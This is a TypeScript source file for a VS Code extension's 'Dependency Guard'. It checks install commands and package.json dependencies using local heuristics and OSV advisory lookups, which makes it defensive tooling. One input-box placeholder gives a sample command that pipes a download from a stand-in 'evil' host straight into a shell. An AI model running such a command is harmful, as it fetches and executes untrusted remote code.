import * as vscode from "vscode";
import { escapeHtml, showInfoWebview } from "../firewall/util";
import { PROTECTION } from "../protection/ProtectionLevel";
import {
    OSV_BATCH_LIMIT,
    analyzeInstallCommand,
    analyzePackage,
    mergeOsvIntoRisk,
    normalizeVersion,
    queryOsv,
    queryOsvBatch,
    splitNameVersion,
    type DependencyRisk,
} from "./DepGuardCore";

// Re-export pure API for any in-extension consumers / tests that still import here.
export {
    analyzeInstallCommand,
    analyzePackage,
    queryOsv,
    queryOsvBatch,
    mergeOsvIntoRisk,
    normalizeVersion,
    splitNameVersion,
    OSV_BATCH_LIMIT,
} from "./DepGuardCore";
export type { DependencyRisk, OsvLookupResult, OsvVulnerability } from "./DepGuardCore";

/**
 * Dependency Guard — VS Code command surface.
 *
 * Protection level: DETECTION_ONLY / ADVISORY_ONLY
 * - Heuristic checks (typosquat, unpinned, remote URL, install scripts) are local.
 * - CVE intelligence comes from the public OSV API when online mode is enabled.
 * - SoterAI does NOT claim to be a full SCA product.
 * - Cannot block npm/pip install executed outside SoterAI-reviewed commands.
 */

function protectionBanner(): string {
    return `<p class="meta"><b>Coverage:</b> ${escapeHtml(PROTECTION.MONITORED.label)} · ` +
        `Dependency Guard is advisory. CVE data from <a href="https://osv.dev">OSV</a> when online; ` +
        `heuristics always run locally. Cannot block installs outside SoterAI-reviewed commands.</p>`;
}

export function registerDepGuardCommands(context: vscode.ExtensionContext): void {
    const reg = (id: string, handler: (...args: any[]) => any) =>
        context.subscriptions.push(vscode.commands.registerCommand(id, handler));

    reg("soterai.checkDependencyInstall", async () => {
        const input = await vscode.window.showInputBox({
            title: "SoterAI: Check Dependency Install",
            prompt: "Enter the install command or package name to check",
            placeHolder: "e.g. npm install express@4.18.2, pip install requests, curl http://evil/x | sh",
            ignoreFocusOut: true,
        });
        if (!input) return;

        let findings = analyzeInstallCommand(input);

        const pkgMatch = input.match(/(?:npm|yarn|pnpm)\s+(?:i|install|add)\s+(?:--save-dev\s+)?(?:--save\s+)?(?:-D\s+)?([^\s]+)/i);
        if (pkgMatch) {
            const { name, version } = splitNameVersion(pkgMatch[1]);
            const online = await confirmOnlineOsv();
            if (online) {
                const osv = await queryOsv(name, version, "npm");
                const base = findings.find((f) => f.name === name) ?? analyzePackage(name, version);
                const merged = mergeOsvIntoRisk(base, osv);
                findings = findings.filter((f) => f.name !== name).concat(merged.risk !== "low" || (merged.osvIds?.length ?? 0) > 0 || merged.reasons.length > 0 ? [merged] : []);
            }
        }

        if (findings.length === 0) {
            vscode.window.showInformationMessage("No dependency risks detected (heuristics; OSV skipped or clean).");
            return;
        }

        const rows = findings
            .map(
                (f) =>
                    `<tr><td><code>${escapeHtml(f.name)}</code></td>` +
                    `<td><span class="badge ${escapeHtml(f.risk)}">${escapeHtml(f.risk.toUpperCase())}</span></td>` +
                    `<td>${escapeHtml(f.advisorySource ?? "heuristic")}</td>` +
                    `<td>${f.reasons.map((r) => escapeHtml(r)).join("<br>")}</td></tr>`,
            )
            .join("");

        showInfoWebview(
            "soteraiDepRisk",
            "SoterAI: Dependency Risk",
            `<h1>Dependency Risk Analysis</h1>${protectionBanner()}<p>${findings.length} risk(s) found.</p>
            <table><tr><th>Package</th><th>Risk</th><th>Source</th><th>Reasons</th></tr>${rows}</table>`,
        );
    });

    reg("soterai.scanPackageJsonRisk", async () => {
        const folder = vscode.workspace.workspaceFolders?.[0];
        if (!folder) return vscode.window.showErrorMessage("No workspace open.");

        try {
            const uri = vscode.Uri.joinPath(folder.uri, "package.json");
            const text = new TextDecoder().decode(await vscode.workspace.fs.readFile(uri));
            const pkg = JSON.parse(text);
            const deps = { ...pkg.dependencies, ...pkg.devDependencies } as Record<string, string>;
            let findings: DependencyRisk[] = [];

            for (const [name, version] of Object.entries(deps ?? {})) {
                const risk = analyzePackage(name, String(version));
                if (risk.risk !== "low") findings.push(risk);
            }

            const online = await confirmOnlineOsv();
            if (online) {
                const candidates = Object.entries(deps ?? {})
                    .map(([name, version]) => ({ name, version: String(version) }))
                    .filter((p) => {
                        const v = normalizeVersion(p.version);
                        return v && v !== "latest" && v !== "*";
                    })
                    .slice(0, OSV_BATCH_LIMIT);

                await vscode.window.withProgress(
                    {
                        location: vscode.ProgressLocation.Notification,
                        title: "SoterAI: querying OSV advisories…",
                        cancellable: false,
                    },
                    async () => {
                        const osvResults = await queryOsvBatch(candidates);
                        const byName = new Map(osvResults.map((r) => [r.packageName, r]));
                        const existing = new Map(findings.map((f) => [f.name, f]));
                        for (const [name, version] of Object.entries(deps ?? {})) {
                            const osv = byName.get(name);
                            if (!osv) continue;
                            const base = existing.get(name) ?? analyzePackage(name, String(version));
                            const merged = mergeOsvIntoRisk(base, osv);
                            if (merged.risk !== "low" || (merged.osvIds?.length ?? 0) > 0) {
                                existing.set(name, merged);
                            }
                        }
                        findings = [...existing.values()];
                    },
                );
            }

            const rows = findings
                .map(
                    (f) =>
                        `<tr><td><code>${escapeHtml(f.name)}</code></td><td>${escapeHtml(f.version)}</td>` +
                        `<td><span class="badge ${escapeHtml(f.risk)}">${escapeHtml(f.risk.toUpperCase())}</span></td>` +
                        `<td>${escapeHtml(f.advisorySource ?? "heuristic")}</td>` +
                        `<td>${f.reasons.map((r) => escapeHtml(r)).join("<br>")}</td></tr>`,
                )
                .join("");

            showInfoWebview(
                "soteraiPackageRisk",
                "SoterAI: package.json Risk",
                `<h1>package.json Dependency Risk</h1>${protectionBanner()}
                <p>${Object.keys(deps ?? {}).length} dependencies, ${findings.length} with elevated risk` +
                    `${online ? " (OSV online)" : " (heuristics only)"}.</p>
                <table><tr><th>Package</th><th>Version</th><th>Risk</th><th>Source</th><th>Reasons</th></tr>
                ${rows || "<tr><td colspan='5'>No elevated-risk dependencies found.</td></tr>"}</table>`,
            );
        } catch (err: any) {
            vscode.window.showErrorMessage(`Could not read package.json: ${err.message}`);
        }
    });

    reg("soterai.reviewAISuggestedDependency", async () => {
        const input = await vscode.window.showInputBox({
            title: "SoterAI: Review AI Suggested Dependency",
            prompt: "Paste the AI-suggested install command",
            placeHolder: "e.g. npm install awesome-new-package@1.0.0",
            ignoreFocusOut: true,
        });
        if (!input) return;

        let findings = analyzeInstallCommand(input);
        const pkgMatch = input.match(/(?:npm|yarn|pnpm)\s+(?:i|install|add)\s+(?:--save-dev\s+)?(?:--save\s+)?(?:-D\s+)?([^\s]+)/i);
        if (pkgMatch) {
            const { name, version } = splitNameVersion(pkgMatch[1]);
            const online = await confirmOnlineOsv();
            if (online) {
                const osv = await queryOsv(name, version, "npm");
                const base = findings.find((f) => f.name === name) ?? analyzePackage(name, version);
                findings = [mergeOsvIntoRisk(base, osv), ...findings.filter((f) => f.name !== name)];
            }
        }

        if (findings.length === 0) {
            vscode.window.showInformationMessage("No risks detected in the suggested dependency.");
        } else {
            const top = findings[0];
            const msg = `Risk level: ${top.risk.toUpperCase()}. ${top.reasons.join("; ")} [${PROTECTION.MONITORED.label}]`;
            if (top.risk === "critical") vscode.window.showErrorMessage(`[SoterAI BLOCK recommendation] ${msg}`);
            else if (top.risk === "high") vscode.window.showWarningMessage(`[SoterAI WARNING] ${msg}`);
            else vscode.window.showInformationMessage(`[SoterAI INFO] ${msg}`);
        }
    });
}

async function confirmOnlineOsv(): Promise<boolean> {
    const config = vscode.workspace.getConfiguration("soterai");
    const pref = config.get<string>("dependencyGuard.osvMode") ?? "ask";
    if (pref === "always") return true;
    if (pref === "never") return false;
    const choice = await vscode.window.showQuickPick(
        [
            { label: "Query OSV online", description: "Send package names/versions to api.osv.dev (no secrets)", value: true },
            { label: "Heuristics only", description: "Stay offline — typosquat/pin/script checks only", value: false },
        ],
        { title: "SoterAI Dependency Guard — advisory source", ignoreFocusOut: true },
    );
    return choice?.value === true;
}
